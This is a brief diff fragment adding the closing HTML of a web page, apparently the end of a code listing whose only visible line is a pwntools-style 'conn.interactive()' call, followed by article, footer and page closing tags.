+conn<span style="color:#ff6ac1">.</span>interactive()
+</code></pre></div>
+        </div>
+
+    </article>
+
+</div>
+
+
+            <footer class="footer">    
+</footer>
+
+        </div>
+    </body>
+
+    
+
+</html>
